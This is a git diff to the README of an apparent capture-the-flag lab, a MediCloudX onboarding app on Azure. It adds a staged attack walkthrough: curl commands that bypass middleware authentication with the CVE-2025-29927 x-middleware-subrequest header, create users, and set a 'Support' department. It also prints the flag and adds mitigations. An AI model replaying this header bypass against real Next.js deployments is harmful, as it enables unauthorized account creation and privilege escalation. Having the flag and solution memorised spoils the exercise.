@@ -27,6 +27,11 @@ The MediCloudX Workforce Onboarding system is deployed on Azure using modern clo
 - `GET /` - Main dashboard (requires authentication)
 - `GET /login` - Authentication page
 - `POST /api/create-user` - User creation endpoint (protected)
+- `POST /api/update-departament` - User department update endpoint (protected)
+- `GET /api/version` - System version information
+- `GET /docs` - API documentation endpoint
+- `GET /support` - Support Hub landing page
+- `POST /api/validate/support` - Support department validation endpoint
 
 ### Authentication Flow
 
@@ -58,6 +63,27 @@ When a user creation request is made to `/api/create-user`, the application:
 2. Creates a secure temporary password (16 characters)
 3. Constructs user data object with Azure AD fields
 4. Returns user information including temporary credentials
+
+### Support Hub Integration
+
+The application includes a **Support Hub** feature accessible at `/support` that demonstrates privilege escalation scenarios:
+
+**OAuth Integration**:
+1. Microsoft OAuth 2.0 authentication flow
+2. Azure AD integration for user identity verification
+3. Department-based access control
+
+**Privilege Validation Process**:
+1. User completes OAuth authentication
+2. Application validates user's department via Microsoft Graph API
+3. Only users with department="Support" gain access to restricted content
+4. Flag is revealed upon successful validation: `CTF{support_department_oauth_bypass_complete}`
+
+**Technical Implementation**:
+- `/support/login` - Initiates Microsoft OAuth flow
+- `/support/callback` - Handles OAuth response and redirects to dashboard
+- `/support/dashboard` - Interactive interface with validation button
+- `/api/validate/support` - Backend validation endpoint using application credentials
 
 ## Security Implementation
 
@@ -135,16 +161,35 @@ x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middle
 3. **User creation capabilities** - Can create real Azure AD users
 4. **Privilege escalation** - Gains administrative functions without authorization
 
-### Verification Steps
+## Complete Attack Flow: Multi-Stage Privilege Escalation
 
-1. **Test normal behavior** (should redirect):
+### Stage 1: Reconnaissance and Discovery
+
+1. **Directory Enumeration**: Discover the `/docs` endpoint
+   ```bash
+   curl -X GET https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/docs
+   ```
+
+2. **API Documentation Analysis**: The `/docs` endpoint reveals critical information:
+   - Available API endpoints and their methods
+   - Request body structures for protected APIs
+   - Authentication requirements for each endpoint
+
+   **Key discoveries from `/docs`**:
+   - `POST /api/create-user` - User creation (empty body: `{}`)
+   - `POST /api/update-departament` - Department assignment (requires: `{"id": "", "departament": ""}`)
+   - `GET /api/version` - System information
+
+### Stage 2: Authentication Bypass
+
+3. **Test normal behavior** (should redirect):
    ```bash
    curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
      -H "Content-Type: application/json" \
      -d "{}" -v
    ```
 
-2. **Test vulnerability** (should succeed):
+4. **Exploit CVE-2025-29927** (should succeed):
    ```bash
    curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
      -H "Content-Type: application/json" \
@@ -152,12 +197,52 @@ x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middle
      -d "{}" -v
    ```
 
-### Mitigation
+5. **Extract User Information**: From the successful response, capture the created user's ID for the next stage.
 
-- **Immediate**: Upgrade to Next.js 15.3.0+ where this vulnerability has been patched
-- **WAF Rule**: Block requests containing `x-middleware-subrequest` header at the web application firewall level
+### Stage 3: Privilege Escalation
+
+6. **Department Assignment Exploitation**: Use the discovered API structure to elevate privileges
+   ```bash
+   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/update-departament \
+     -H "Content-Type: application/json" \
+     -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
+     -d '{"id": "USER_ID_FROM_STAGE_2", "departament": "Support"}' -v
+   ```
+
+### Stage 4: Access Restricted Resources
+
+7. **Support Hub Access**: Navigate to the Support Hub using created credentials
+   - Access: `https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/support`
+   - Authenticate with Microsoft OAuth using the created user account
+   - Click "Access Restricted Content" button
+
+8. **Flag Capture**: The validation endpoint confirms Support department access and reveals the flag:
+   ```
+   CTF{support_department_oauth_bypass_complete}
+   ```
+
+### Attack Impact Summary
+
+**Complete compromise achieved through**:
+1. **Information Disclosure** - `/docs` reveals API structure
+2. **Authentication Bypass** - CVE-2025-29927 circumvents all protections
+3. **Privilege Escalation** - Department assignment to "Support" role
+4. **Unauthorized Access** - Full access to restricted Support Hub resources
+
+### Verification Steps
+
+### Mitigation Strategies
+
+**Immediate Actions**:
+- **Framework Update**: Upgrade to Next.js 15.3.0+ where CVE-2025-29927 has been patched
+- **WAF Implementation**: Block requests containing `x-middleware-subrequest` header at the web application firewall level
+- **Endpoint Security**: Remove or secure the `/docs` endpoint to prevent information disclosure
+
+**Long-term Security**:
 - **Code Review**: Implement additional authorization checks within API route handlers
 - **Defense in Depth**: Never rely solely on middleware for security-critical operations
+- **API Security**: Implement proper OAuth scopes and permission validation for sensitive endpoints
+- **Monitoring**: Add detection rules for unusual API usage patterns and privilege escalation attempts
 
 ## Deployment Configuration
 
